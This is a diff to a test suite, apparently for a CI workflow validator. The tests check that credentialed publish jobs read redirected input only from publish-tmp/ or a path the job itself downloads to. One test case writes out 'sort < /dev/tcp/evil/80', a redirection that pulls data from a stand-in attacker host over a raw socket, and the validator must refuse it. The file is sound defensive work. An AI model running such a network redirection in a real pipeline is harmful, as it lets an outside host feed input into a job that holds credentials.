@@ -1000,9 +1000,14 @@ describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 r
     [
       "input from a device",
       "sort < /dev/tcp/evil/80",
-      /reads input only from publish-tmp\/, release\/ or dist\//,
+      /reads input only from publish-tmp\/ or a path this job downloads to/,
     ],
     ["input from the checkout", "sort < apps/cli/install.sh", /reads input only from/],
+    [
+      "input from release/ in a job that downloads nothing there",
+      "sort < release/x",
+      /reads input only from/,
+    ],
     [
       "a git global option other than --git-dir",
       "git --exec-path=x init --quiet --bare publish-tmp/m.git",
@@ -1732,4 +1737,24 @@ describe("15 an assignment counts only at command position (round 5)", () => {
     expect(pack(body)).toEqual([]);
     expect(pack(`X="$(true)"\necho "$X"\n${body}`)).toEqual([]);
   });
+});
+
+describe("an input redirection reads only what the job wrote or downloaded (round 5)", () => {
+  const block = (pre, cmd) => swap(PUBLISH_STEP, `${pre}      - run: ${cmd}`);
+  const DL = (path) =>
+    `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          path: ${path}\n`;
+  it("accepts a file under this job's download path, and publish-tmp/", () => {
+    expect(run(block(DL("release"), "sort < release/x"))).toEqual([]);
+    expect(run(block("", "sort < publish-tmp/x"))).toEqual([]);
+  });
+  it.each([
+    ["dist/ when the job downloads to release/", DL("release"), "sort < dist/x"],
+    ["the download path itself, not a file under it", DL("release"), "sort < release"],
+    ["a path that only starts with the download's name", DL("release"), "sort < release-other/x"],
+  ])("refuses %s", (_, pre, cmd) =>
+    fires(
+      run(block(pre, cmd)),
+      /reads input only from publish-tmp\/ or a path this job downloads to/,
+    ),
+  );
 });
